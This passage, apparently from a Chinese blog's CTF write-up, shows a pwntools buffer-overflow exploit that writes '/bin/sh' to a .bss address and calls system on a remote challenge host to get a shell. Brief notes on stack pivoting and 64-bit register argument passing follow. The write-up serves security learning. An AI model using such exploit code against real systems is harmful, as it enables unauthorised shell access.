+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,51402)</span><br><span class="line"></span><br><span class="line">system_call &#x3D; 0x804855A</span><br><span class="line">bss &#x3D; 0x804A080</span><br><span class="line"></span><br><span class="line">payload &#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;please tell me your name\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload &#x3D;&#39;a&#39;*0x26+p32(0)+p32(system_call)+p32(bss)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;hello,you can leave some message here:\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210715151316871.png?raw=true" alt="image-20210715151316871.png"></p>
+<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>1.我们需要了解栈的结构，是rsp指向哪里，那里就是栈顶而不是栈顶在哪里rsp就在那。正也是我们栈转移能实现的原因。</p>
+<p>2.对于参数传递的了解，在64位中参数是通过寄存器传递的，参数先是找rdi, rsi, rdx, rcx, r8, r9（前六个是从左到右依次传递），超过六个则是从右至左依次压入栈中。（这里也是我们每次call system的重点）</p>
+</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">徐小宇</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/07/13/gf713/">http://example.com/2021/07/13/gf713/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/06/13/gf-4/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">gf-4</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 徐小宇</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
